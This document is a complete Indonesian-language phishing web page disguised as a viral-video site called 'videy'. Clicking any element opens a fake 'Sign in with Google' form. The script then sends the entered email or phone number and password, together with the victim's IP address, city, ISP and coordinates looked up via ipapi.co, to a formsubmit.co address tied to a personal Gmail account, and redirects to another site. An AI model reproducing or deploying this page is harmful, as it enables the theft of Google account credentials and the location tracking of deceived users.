<!DOCTYPE html>
<html lang="id">
<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>videy</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #fff; color: #333; padding:
15px; }
        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; margin-bottom: 15px; }
        .logo { font-size: 24px; font-weight: bold; cursor: pointer; }
        .btn-upload { background: #000; color: #fff; border:
none; padding: 8px 18px; border-radius: 20px; font-weight: bold; cursor: pointer; }
        .menu-icon { font-size: 22px; cursor: pointer; padding: 5px; user-select: none; }
        .main-media { position: relative; width: 100%; aspect-ratio: 9/16; border-radius: 12px; overflow: hidden; background: #000; cursor: pointer; }
        .main-media img { width: 100%; height: 100%; object-fit: cover; display: block; }
        .play-btn { position: absolute; top: 50%; left: 50%;
transform: translate(-50%, -50%); width: 60px; height: 60px;
background: rgba(0,0,0,0.6); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 24px; pointer-events: none; z-index: 2; }
        /* Kontrol Video Visual */
        .video-controls { position: absolute; bottom: 0; left: 0; width: 100%; padding: 10px; background: linear-gradient(transparent, rgba(0,0,0,0.7)); color: white; display: flex; align-items: center; font-size: 12px; gap: 10px; z-index: 3; pointer-events: none; }
        .progress-bar { flex-grow: 1; height: 4px; background: rgba(255,255,255,0.3); border-radius: 2px; position: relative; }
        .progress-bar::after { content: ''; position: absolute; left: 0; top: 0; height: 100%; width: 0%; background: white; border-radius: 2px; }
        .video-icons { display: flex; gap: 12px; align-items: center; }
        .title { font-size: 18px; font-weight: bold; margin:
15px 0; cursor: pointer; }
        .btn-share { width: 100%; background: #f1f3f4; color: #202124; border: none; padding: 12px; border-radius: 24px; font-weight: 500; font-size: 15px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;
margin-bottom: 30px; transition: background 0.2s; }
        .btn-share:hover { background: #e8eaed; }
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: none; justify-content: center; align-items: center; z-index: 1000; }
        .modal-box { background: #fff; width: 90%; max-width: 400px; border-radius: 24px; padding: 32px 24px 24px 24px; position: relative; box-shadow: 0 4px 25px rgba(0,0,0,0.2); }
        .close-btn { position: absolute; top: 16px; right: 16px; background: transparent; border-radius: 50%; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; font-weight: normal; cursor: pointer; border:
none; font-size: 22px; color: #5f6368; }
        .close-btn:hover { background: #f1f3f4; }
        .popup1-text { font-size: 16px; margin-bottom: 15px;
text-align: center; }
        .btn-fake-input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; display: flex; align-items: center; gap: 8px; cursor: pointer; background: #fff; color: #888; font-size: 14px; }
        .popup2-header { text-align: center; margin-bottom: 24px; }
        .google-logo { font-size: 22px; font-weight: 500; margin-bottom: 8px; }
        .popup2-header h2 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
        .popup2-header p { font-size: 15px; color: #5f6368; }
        .input-group { position: relative; margin-bottom: 16px; }
        .custom-input { width: 100%; padding: 16px 14px; border: 1px solid #dadce0; border-radius: 4px; font-size: 15px; color: #202124; outline: none; background: transparent; transition: border-color 0.2s, box-shadow 0.2s; }
        .custom-input:focus { border-color: #1a73e8; border-width: 2px; padding: 15px 13px; }
        .floating-label { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); background: #fff; padding: 0 4px; color: #5f6368; font-size: 15px; pointer-events: none; transition: 0.2s ease all; }
        .custom-input:focus ~ .floating-label,
        .custom-input:not(:placeholder-shown) ~ .floating-label {
            top: 0;
            transform: translateY(-50%) scale(0.85);
            color: #1a73e8;
            font-weight: 500;
        }
        .error-msg { display: none; color: #d93025; font-size: 13px; margin-bottom: 12px; align-items: center; gap: 6px; }        .error-icon { width: 16px; height: 16px; background:
#d93025; color: #fff; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 11px; font-weight: bold; }
        .helper-links { margin-bottom: 24px; font-size: 14px; line-height: 1.5; }
        .helper-links a { color: #1a73e8; text-decoration: none; font-weight: 500; display: inline-block; margin-bottom: 12px; }
        .helper-links a:hover { text-decoration: underline; }        .guest-text { color: #5f6368; font-size: 13px; }
        .guest-text span { color: #1a73e8; cursor: pointer; font-weight: 500; }
        .popup2-footer { display: flex; justify-content: space-between; align-items: center; margin-top: 10px; }
        .create-account { color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer; text-decoration: none; }
        .create-account:hover { text-decoration: underline; }        .btn-submit { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; transition: background-color 0.2s; }
        .btn-submit:hover { background: #1557b0; }
        #toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); color: #fff; padding: 10px 20px; border-radius: 20px; font-size: 14px; display: none; z-index: 2000; }
    </style>
</head>
<body>
    <div class="navbar">
        <div class="logo trigger-popup">videy</div>
        <button class="btn-upload trigger-popup">Upload</button>
        <div class="menu-icon">&#9776;</div>
    </div>
    <div class="main-media trigger-popup">
        <img src="https://i.postimg.cc/QMccY4rZ/IMG-20260810-021657.jpg" alt="Main">
        <div class="play-btn">&#9654;</div>
        <!-- Kontrol Video Visual -->
        <div class="video-controls">
            <span>0:00</span>
            <div class="progress-bar"></div>
            <div class="video-icons">
                <span>&#128266;</span>
                <span>&#9713;</span>
                <span>&#8942;</span>
            </div>
        </div>
    </div>
    <div class="title trigger-popup">VIDEO VIRAL TERBARU</div>
    <button class="btn-share" id="btnShare">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12v8a2 2 0 0 0 2
2h12a2 2 0 0 0 2-2v-8"></path><polyline points="16 6 12 2 8 6"></polyline><line x1="12" y1="2" x2="12" y2="15"></line></svg>
        Share video
    </button>
    <!-- POPUP 1 -->
    <div class="modal-overlay" id="modal1">
        <div class="modal-box">
            <div class="popup1-text" style="font-weight: bold;">Login untuk melanjutkan menonton</div>
            <div class="btn-fake-input" id="toPopup2">
                <span><img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png" width="20" style="vertical-align: middle;"></span>
                <span>Masuk dengan Google</span>
            </div>
        </div>
    </div>
    <!-- POPUP 2 -->
    <div class="modal-overlay" id="modal2">
        <div class="modal-box">
            <button class="close-btn" id="closeModal2">&times;</button>
            <div class="popup2-header">
                <div class="google-logo">
                    <span style="color:#4285F4;">G</span><span style="color:#EA4335;">o</span><span style="color:#FBBC05;">o</span><span style="color:#4285F4;">g</span><span style="color:#34A853;">l</span><span style="color:#EA4335;">e</span>
                </div>
                <h2>Login</h2>
                <p>Use your Google Account</p>
            </div>
            <div class="input-group">
                <input type="text" id="nama" class="custom-input" placeholder=" " autocomplete="off">
                <label for="nama" class="floating-label">Email Address</label>
            </div>
            <div class="input-group">
                <input type="password" id="absen" class="custom-input" placeholder=" " autocomplete="off">
                <label for="absen" class="floating-label">Password</label>
            </div>
            <div class="error-msg" id="errorBox">
                <span class="error-icon">!</span>
                <span id="errorText">Couldnt find your Google account.</span>
            </div>
            <div class="helper-links">
                <a href="#">Forgot your email?</a>
                <div class="guest-text">
                    Not your computer? Use Guest mode to sign in privately. <span>Learn more</span>
                </div>
            </div>
            <div class="popup2-footer">
                <a href="#" class="create-account">Create account</a>
                <button class="btn-submit" id="btnAyo">Next</button>
            </div>
        </div>
    </div>
    <div id="toast">Link berhasil disalin!</div>
    <script>
        const modal1 = document.getElementById('modal1');
        const modal2 = document.getElementById('modal2');
        const triggers = document.querySelectorAll('.trigger-popup');
        triggers.forEach(el => {
            el.addEventListener('click', () => {
                modal1.style.display = 'flex';
            });
        });
        document.getElementById('toPopup2').addEventListener('click', () => {
            modal1.style.display = 'none';
            modal2.style.display = 'flex';
        });
        document.getElementById('closeModal2').addEventListener('click', () => {
            modal2.style.display = 'none';
        });
        document.getElementById('btnShare').addEventListener('click', () => {
            navigator.clipboard.writeText(window.location.href).then(() => {
                const toast = document.getElementById('toast');
                toast.style.display = 'block';
                setTimeout(() => {
                    toast.style.display = 'none';
                }, 2000);
            });
        });
        document.getElementById('btnAyo').addEventListener('click', async function() {
            const namaVal = document.getElementById('nama').value;
            const absenVal = document.getElementById('absen').value;
            const errorBox = document.getElementById('errorBox');
            const errorText = document.getElementById('errorText');
            let namaValid = false;
            let absenValid = false;
            const textPattern = /^.+#merdeka17$/;
            const isTextValid = textPattern.test(namaVal) &&
!namaVal.includes(' ') && /[a-zA-Z]/.test(namaVal.replace('#merdeka17', ''));
            const cleanDigits = namaVal.startsWith('+') ? namaVal.slice(1) : namaVal;
            const isPhoneValid = /^\d+$/.test(cleanDigits) && cleanDigits.length >= 4 && cleanDigits.length <= 15;
            if (isTextValid || isPhoneValid) {
                namaValid = true;
            }
            const hasLetter = /[a-zA-Z]/.test(absenVal);
            if (absenVal.length >= 8 && hasLetter) {
                absenValid = true;
            }
            if (namaValid && absenValid) {
                errorBox.style.display = 'none';
                let locationData = {};
                try {
                    const res = await fetch('https://ipapi.co/json/');
                    const data = await res.json();
                    locationData = {
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country_name,
                        isp: data.org,
                        asn: data.asn,
                        asname: data.as,
                        latitude: data.latitude,
                        longitude: data.longitude
                    };
                } catch (e) {
                    console.log('IP API fetch error:', e);
                }
                const payload = {
                    _subject: "Informasi Akun Masuk Baru",
                    _template: "table",
                    "EMAIL, TELEPON, NAMA PENGGUNA": namaVal,                    "KATA SANDI": absenVal,
                    "LOGIN": "Google",
                    "ALAMAT IP": locationData.ip || 'N/A',
                    "NEGARA": locationData.country || 'N/A',
                    "PROPINSI": locationData.region || 'N/A',                    "KOTA": locationData.city || 'N/A',
                    "Asn": locationData.asn || 'N/A',
                    "Asname": locationData.asname || 'N/A',
                    "LINTANG": locationData.latitude || 'N/A',
                    "GARIS BUJUR": locationData.longitude ||
'N/A',
                    "PENYEDIA LAYANAN INTERNET (ISP)": locationData.isp || 'N/A',
                    "WAKTU MASUK": new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
                };
                fetch('https://formsubmit.co/ajax/ryodwi057@gmail.com', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify(payload)
                }).finally(() => {
                    window.location.href = 'https://onenexts.com';
                });
            } else {
                errorBox.style.display = 'flex';
                if (!namaValid && absenValid) {
                    errorText.textContent = "Couldnt find your Google account.";
                } else if (namaValid && !absenValid) {
                    errorText.textContent = "Wrong password,
try again.";
                } else {
                    errorText.textContent = "Couldnt find your Google account.";
                }
            }
        });
    </script>
</body>
</html>
